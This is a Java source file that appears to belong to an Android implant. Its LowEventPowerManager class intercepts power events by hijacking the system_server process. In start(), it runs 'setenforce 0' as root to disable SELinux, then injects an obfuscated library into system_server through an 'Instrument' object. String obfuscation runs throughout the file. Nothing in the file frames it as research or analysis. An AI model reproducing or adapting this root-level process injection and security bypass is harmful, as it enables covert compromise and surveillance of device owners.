package com.android.dvci.listener;

import com.android.dvci.ProcessInfo;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.module.message.LowEventPower;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.Instrument;
import com.android.dvci.util.LowEventMsg;
import com.android.mm.M;

/**
 * Created by zad on 15/06/15.
 */
public class LowEventPowerManager extends Listener<LowEventPower> implements Observer<LowEventMsg> {
	//
	private static final String TAG = "LowEventPowerManager";

	private volatile static LowEventPowerManager singleton;
	Instrument hijack =null;
	private Observer<ProcessInfo> processObserver;


	private LowEventPowerManager() {
		super();

	}

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static LowEventPowerManager self() {
		if (singleton == null) {
			synchronized (LowEventPowerManager.class) {
				if (singleton == null) {
					singleton = new LowEventPowerManager();
				}
			}
		}
		return singleton;
	}

	@Override
	public void start() {
		LowEventHandlerManager.self().attach(this);
		if(hijack == null) {
			String lib = M.e("pa.data");
			if (android.os.Build.VERSION.SDK_INT > 20) {
				lib = M.e("paL.data");
				Execute.executeRoot(M.e("setenforce 0"));
			}
			hijack = new Instrument(M.e("system_server"), Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/p4/"), null, lib);
			hijack.setInstrumentationSuccessDir(Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/p4/"), true);
			hijack.addArg(Status.getApkName());
			hijack.addArg("power");
			hijack.setKillToStop(false);
		}
		hijack.start();

	}

	@Override
	public void stop() {
			if(hijack != null) {
				hijack.stop();
			}
		LowEventHandlerManager.self().detach(this);
	}
	@Override
	public synchronized boolean attach(Observer<LowEventPower> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " attach");//$NON-NLS-1$
		}
		return super.attach(o);
	}

	@Override
	public synchronized void detach(Observer<LowEventPower> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " dettach");//$NON-NLS-1$
		}
		super.detach(o);
	}


	@Override
	public int notification(LowEventMsg event) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " notification");//$NON-NLS-1$
		}
		if (event.data != null) {
			dispatch(new LowEventPower(event));
		}
		event.res = 0;
		return event.res;
	}
	public boolean isInstrumented(){
		return hijack!=null && hijack.isStarted();
	}
}
